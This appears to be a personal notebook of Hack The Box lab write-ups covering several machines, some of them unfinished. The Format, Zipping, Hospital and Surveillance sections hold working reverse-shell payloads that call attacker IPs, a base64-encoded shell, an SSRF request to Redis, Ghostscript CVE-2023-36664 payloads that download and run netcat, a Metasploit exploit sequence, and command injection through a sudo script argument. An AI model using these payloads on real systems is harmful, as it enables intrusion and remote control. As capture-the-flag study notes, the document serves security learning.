# Medium\_machines

##

## OnlyForYou

> To obtain access we must read various files on the web using an LFI to find a vulnerability in the form. Using the form we can run CERs. To move to a user we must perform a Cypher Injection on an internal website to get the password. And for the escalation of privileges we must modify a file, create a tar.gz and upload it to the Gogs web intera and then download the file using pip3 and thus be able to modify the bash to SUID permissions.

### Reco

1. nmap 10.10.11.210 -sVC
2. dir busting
   * there is a subdomain ![](https://hackmd.io/\_uploads/rytoaqich.png)
   * add it also to the /etc/hosts

### Weaponisation

1. beta subdomain
   * allows us to download source code ![](https://hackmd.io/\_uploads/BklH0qoqh.png)
     * When analyzing it we realize that in the / download path if in the parameter image start with 2 points then launch a message that says Hacking detected and makes us a redirect to / list. ![](https://hackmd.io/\_uploads/HkT9C5iq3.png)

### Exploitation

1.

### User flag

### Root flag

## Format

### Reco

1. nmap: `nmap -sVC 10.10.11.213`
   * 22 SSH
   * 80,3000 HTTP
2. add microblog.htb:3000 to /etc/hosts
3. FUZZING - subdomain enumeration
   * app, sunny
     * add these both to /etc/hosts also
4. Website
   * "Contribute here!" in footer -> source code of app.microblog.htb

### Weaponisation

1. LFI
   * we can use ID parameter for LFI
     * create a blog -> edit blog
       * capture req to add the H1/text
         * we can edit the ID paramater for LFI ![](https://hackmd.io/\_uploads/SkOVqn0q2.png)

### Exploitation

1. PRO account
   * dashboard page and source code -> something about PRO
   * assign pro to our session using SSRF

> curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:testy%20pro%20true%20a/b

* insert the username of registration

2. Uploading reverse shell
   * use this to get RS on target machine + change your blog name

> id=/var/www/microblog/\<your\_blog\_name>/uploads/rev.php\&header=<%3fphp+echo+shell\_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.30+443+>/tmp/f")%3b%3f> ![](https://hackmd.io/\_uploads/rJj-j309h.png)

* after visiting the /uploads/rev.php we will get our RS

### User flag

1. Connect to Redis-cli
   * socks config file
     * redis-cli -s /var/run/redis/redis.sock
     * keys \* ![](https://hackmd.io/\_uploads/SyLwo205h.png)
     * hgetall cooper.dooper
       * `cooper:zooperdoopercooper`
2. SSH connect to obtain user flag

### Root flag

1. trying `sudo -l`
   * we can run /usr/bin/licence
     * this file is also readable
       * [Python format function vuln](https://web.archive.org/web/20230624063634/https://podalirius.net/en/articles/python-format-string-vulnerabilities/)
2. Vuln
   * register a user using redis-cli and use the vuln in username to print all variables
     * `HSET test2 username test1 password test first-name`
     * `{license.__init__.__globals__} last-name test pro false` ![](https://hackmd.io/\_uploads/S1LOThRq3.png)
   * run /usr/bin/licence as sudo to provision the licence of our "test2" user
     * `sudo /usr/bin/license -p test2` ![](https://hackmd.io/\_uploads/Hy\_na3Rc2.png)
       * we obtained SSH credentials for root
         * `root:unCR4ckaBL3Pa$$w0rd`
3. SSH login as a root to obtain root flag

## Download

### Reco

* `sudo nmap -sVC <IP>`
  * ![](https://hackmd.io/\_uploads/SkZBpNRo3.png)
  * 22 SSH
  * 80 HTTP
    * redirect -> add download.htb to /etc/hosts
* website analysis
  * website for uploading && downloading large files
  * upload subsite
    * download.htb/files/upload
  * login && register subsite
    * downlaod.htb/auth/login
    * download.htb/auth/register

### Weaponisation

1. while trying to upload a file with BurpSuite, I found out tha it is an **Express** based website - upload the file -> we obtain unique UID and link ![](https://hackmd.io/\_uploads/H1ZfZSRo3.png) - click "Copy Link" button -> small popup window followed by an alert - it is a file called copy.js (contains the code for the function, nothing vulnerable) - there is also a JWT token withing the download + a .sig cooke ![](https://hackmd.io/\_uploads/HyJBZrAj3.png) - decoded token: `{"flashes":{"info":[],"error":[],"success":[]}}`
   * Download feature
     * redirects us to the link:
       * `http://download.htb/files/download/0623ba64-6749-48a4-9a08-a58658b74852`
         * this could be used to download other files...
         * uploads are probably stored within a /downloads or /uploads folder on the machine
           * basic LFI with some Express file names...
             * `..%2fapp.js` worked... ![](https://hackmd.io/\_uploads/HJMYk8Cjn.png)
               * there is package.json as part of the folders too: `{ "name": "download.htb", "version": "1.0.0", "description": "", "main": "app.js", "scripts": { "test": "echo \"Error: no test specified\" && exit 1", "dev": "nodemon --exec ts-node --files ./src/app.ts", "build": "tsc" }, "keywords": [], "author": "wesley", "license": "ISC", "dependencies": { "@prisma/client": "^4.13.0", "cookie-parser": "^1.4.6", "cookie-session": "^2.0.0", "express": "^4.18.2", "express-fileupload": "^1.4.0", "zod": "^3.21.4" }, "devDependencies": { "@types/cookie-parser": "^1.4.3", "@types/cookie-session": "^2.0.44", "@types/express": "^4.17.17", "@types/express-fileupload": "^1.4.1", "@types/node": "^18.15.12", "@types/nunjucks": "^3.2.2", "nodemon": "^2.0.22", "nunjucks": "^3.2.4", "prisma": "^4.13.0", "ts-node": "^10.9.1", "typescript": "^5.0.4" } }`
         * AUTHOR: **WESLEY**
2. enumerating LOGIN
   * create a test user && login -> download\_session cookie has some more information (decoded): `{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"test123"}}`
   * .sig token is also different
     * signature of a cookie, changes by the extension
3. VULN for COOKIE on websites running Express
   * [cookie-monster](https://github.com/DigitalInterruption/cookie-monster)
   * [nodeJS Express](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express)

### Exploitation

1. Blind injection - Cookie monster Brute Force Lets sum up all facts we obtained:
   * **.sig** ... key for the token structure, needed fot Cookie Monster
   * User is **wesley**, hashes are UNsalted and used directly for auth -> brute forcing could be a way
   * there is **SQL query** that is somehow injectable
   * **cookies are not validated** any way -> it checks whether a `true` condition is returned from `findFirst` from the `prisma` API module...Blind Injection by redirect could be possibility

## Manager

### Reco

nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd 10.0) - 88 KERBEROS-SEC - 135 MSRPC - 139 NETBIOS-SSN - 389 LDAP - ssl-cert: dc01.manager.htb - 445 MS-DS? - 464 KPASSWD5? - 593 NCACN\_HTTP (RMS win RPC over HTTP 1.0) - 636 SSL/LDAP - DNS: dc01.manager.htb - 1433 MS-SQL-S - MSSQL Server 2019 - 3269 LDAP - 3269 SSL/LDAP - active SMB2 - sec-mode: 311 (message signing enabled and required)

## Zipping

### Reco

#### Nmap&#x20;

`nmap -sVC 10.10.11.229 -Pn`

* 22 SSH (OpenSSH, Ubuntu, protocol 2.0)
* 80 HTTP (Apache httpd 2.4.54, no redirect)

#### Website

* Watch store
* Contact form, Work w us (**upload file**), Shop w cart features

#### Dir busting

`dirb http://10.10.11.229`

* /assets
* /shop
  * /shop/assets
  * /shop/index.php
* /uploads

### Weaponisation

#### Bootstrap

[http://10.10.11.229](http://10.10.11.229/upload.php)/assets

* [http://10.10.11.229/assets/scss/vendors/](http://10.10.11.229/assets/scss/vendors/)
  * bootstrap 4.3.1 from 2019
    * vuln to XSS
    * CVE-2019-8331

#### File upload&#x20;

* we have to upload ZIP file containing PDF
  * PDF can be for example custom made php revesre shell script...

### Exploitation

#### Reverse shell

* [https://www.revshells.com/](https://www.revshells.com/)
* IP & port
  * sh -i >& /dev/tcp/\<IP>/\<PORT> 0>&1
* Final Payload for shell.php file
  *   **`<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'") ?>`**

      <figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

#### Craft ZIP+PDF from php script

`mv shell.php shell.phpA.pdf`

`zip zip.zip shell.phpA.pdf`

`hexedit zip.zip`

* change phpA.pdf -> change A char to 0
  * hex: **41 -> 00**
  *

      <figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

upload file & go to generated URL with removed .pdf extension (onlyhttp://......./shell.php)

reserse shell should be obtained in nc -nlvp \<PORT>

### User flag

* Craft the pdf file with base64 encoded command for cat of user.txt...
*

### Root flag

## Hospital

### Reco

#### nmap

`nmap 10.10.11.241 -sVC`

* 22 SSH
* 53 Domain - Simple DNS Plus
* 88 Kerberos-sec
* 135,2103,2105 MSRPC
* 139 Netbios-ssn
* 389,3268 LDAP
* 443 HTTPS
* .....
* 3389 MS-WBT-Server
* 8080 HTTP
  * PHPSESSID = httponly flag not set
  * potentially OPEN proxy
* Host script results
  * smb2
    * sec-mode 311 (message signing enabled and required)

#### Redirect

`sudo nano /etc/hosts`

* 10.10.11.241 hospital.htb

#### Website

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption><p>http://10.10.11.241:8080</p></figcaption></figure>

### Weaponisation

#### Register & Login

* 10.10.14.241:8080
  * Register & Login
    * I created: Tester:testtest

#### Upload page

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption><p>10.10.11.241:8080/index.php</p></figcaption></figure>

#### dirb

dirb http://10.10.11.241:8080/ /usr/share/wordlists/dirb/common.txt

* /css
* /fonts
* /images
* /js
* /l
* /m
* /u
* **/uploads**
* /vendor
* /w

Uploads subpage is important for us. When we upload a file, we can access it via 10.10.11.241:8080/uploads/\<file>

### Exploitation

#### p0wnyshell Tool

* git clone https://github.com/flozz/p0wny-shell
* after cloning, copy php file into phar extension
  * cp shell.php shell.phar
*   upload shell.phar to 10.10.11.241:8080/uploads

    * success
    * redirect to: 10.10.11.241:8080/uploads/shell.phar
      * we have browser Reverse shell

    <figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption><p>10.10.11.241:8080/uploads/shell.phar</p></figcaption></figure>

#### Reverse Shell crafting

`sh -i >& /dev/tcp/<IP>/<PORT> 0>&1`

* base64 encode
  * `c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE=`
* whole command for webshell
  * `echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`
  * we dont have permissions to directly start sh command, but we can echo it under base64

`echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`

`nc -nlvp 4444`

* we obtained reverse shell
  * `python3 -c 'import pty;pty.spawn("/bin/bash")'`
  * `export TERM=xterm`
  * `stty raw -echo; fg`

`There is a user drwilliams`

`/etc/shadow`

* we dont have permissions to read shadow file
  * uname -r
    * Ubuntu (Linux) v5.19
      * EXPLOIT: [https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
        * upload this sh file into reverse shell
        * chmod u+x
        * run (./exploit.sh)
        * we obtained root privileges
* cat /etc/shadow

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

* Decode the PW hash

### User flag

#### drwilliams login

ssh drwilliams@10.10.11.241

* PW: qwe123!@#
* unfortunatelly, no FLAG found

{% embed url="https://10.10.11.241" %}

`drwilliams:qwe123!@#`

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption><p>drwilliams Inbox</p></figcaption></figure>

* there are .eps attachments
* drbrown says sth about GhostScript
  * lets craft malicious one
    * [https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
      * Ghostscript command injection

#### Path traversal to drbrown&#x20;

1. UPLOAD EXPLOIT TO TARGET MACHINE

* `git clone https://github.com/int0x33/nc.exe/`
  * `cd nc.exe`
* Prepare http.server for serving our exploit
  * `python3 -m http.server 8083`

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

* Craft .eps Exploit
  * `python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.7:8083/nc64.exe -o nc.exe" --filename file.eps`

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

* upload it via email attachment (.eps file) answering to drbrown email...
  * phishing

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption><p>upload it via answered email to drbrown</p></figcaption></figure>

* we successfully served nc.exe to our http.server

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

2. OBTAIN REVERSE SHELL

* Crafted second file.eps exploit with netcat port...
  * `python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.7 4444 -e cmd.exe" --filename file.eps`

<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

* `nc -nlvp 4444`

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

* upload exploit via answering email

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

* we have a reverse shell to user DRBROWN

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### drbrown credentials

* `dir`
* `type ghostscript.bat`

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption><p>obtaining PW of user drbrown</p></figcaption></figure>

#### connect via RDP

REMINNA&#x20;

* user: drbrown&#x20;
* IP: 10.10.11.241
* PW: chr!$br0wn

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

### Root flag

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption><p>/xampp/htdocs is writeable</p></figcaption></figure>

we can see there is uploaded shell.php



<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

access website uploaded file...

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**PWNED <3**</mark>

## Surveillance

### Reco

#### nmap

`nmap -sVC 10.10.11.245`

* 22 SSH
* 80 HTTP
  * add to /etc/hosts

<figure><img src=".gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

#### website

* footer
  * Craft CMS v4.4.14

#### dirb

dirb http://surveillance.htb/

* /.htaccess
* /admin
  * redirect to -> /admin/login
* /css
* /fonts
* /images
* /img
  * /index
  * /index.php
* /js
  * /logout
  * /web.config
  * /wp-admin
*

### Weaponisation

#### Craft CMS

* VULN v4.4.14
  * [https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability](https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability)
  * **CVE-2023-41892**
  * critical vuln -> **RCE attacks**
    * exploit is in the public domain
    * can be exploited anonymously
    * high severity and low complexity
    * For Craft v 4.0.0-4.4.14
    * RESULT -> malicious code run on the server to steal sensitive data
  * [https://blog.calif.io/p/craftcms-rce](https://blog.calif.io/p/craftcms-rce)

### Exploitation

#### Exploit

* [https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226)
* nano CVE-2023-41892.py
  * edit the original code
    * ...

### User flag

#### Obtain user credentials

* /html/craft/storage/backups
  *   matthew - bcrypt hash

      * 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
      * hashcat

      <figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

#### SSH

`ssh matthew@10.10.11.245`

* PW: **starcraft122490**
* `cat user.txt`

### Root flag

#### Path traversal #1 (Matthew -> ZoneMinder)

\
1\) Port forward 8080 to your machine\
&#x20;  a) you can use ssh to portforward, but I´m gonna use chisel.\
&#x20;  [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
\
&#x20;  b) run chisel server at attacker's machine`./chisel server --port 1337 --reverse --socks5`\
&#x20;  c) transfer chisel to victim's pc\
&#x20;     i) host local server at attacker's machine`python -m http.server 8888`      ii) at matthew's ssh session`wget <your ip>:8888/chisel`      iii) still at matthew's ssh allow for execute (sanity check)`chmod +x chisel`      iv) establish connection to your chisel server`./chisel client <your ip>:1337 R:<whatever port you wish to forward here>:127.0.0.1:8080 &`\
&#x20;  d) open up your browser and access [http://127](http://0.0.0.127/).0.0.1:\<whatever port you forwarded previously at step c-iv> (you should see zoneminder cms)\
\
2\) launch msfconsole\
`msfconsole`

3\) use the exploit\
`use exploit/unix/webapp/zoneminder_snapshots`

4\) set victim's ip -> in this case it would be the machine's ip\
`set RHOSTS <victim ip>`

5\) set victim's port -> in this case it will be port you forwarded in step 1 above\
`set RPORT <victim port>`

6\) set attacker's ip -> this means your ip\
`set LHOST <your ip>`

7\) set the target path -> in this case it's just /\
`set TARGETURI /`

8\) literally just type exploit \
`exploit`

9\) meterpreter session will be established here get a shell\
`shell`\


#### Path Travesral #2 (zoneminder -> root)

1\) rev.sh file (place this at /tmp) :\
`#!/bin/bash`\
`busybox nc 10.10.xx.xx 443 -e sh`

\
2\) open a listener at port 443\
\
3\) run this as zoneminder user\
`sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/rev.sh)' --pass=ZoneMinderPassword2023`

`cd /root && cat root.txt`

<mark style="color:red;">**PWNED <3**</mark>\




## Monitored

### Reco

#### nmap

`nmap -sVC 10.10.11.248`

* 22 SSH
* 80 HTTP -> redirect: nagios.monitored.htb
* 389 LDAP (OpenLDAP v2.2.X-2.3.X)
* 443 SSL

<figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

/etc/hosts

* sudo nano /etc/hosts

website

<figure><img src=".gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

* Default credentials
  * root:nagiosxi
    * not working
  * root:welcome
    * not working

### Weaponisation



snmpwalk

sudo apt install snmp

<figure><img src=".gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

* svc:

### Exploitation

### User flag

### Root flag
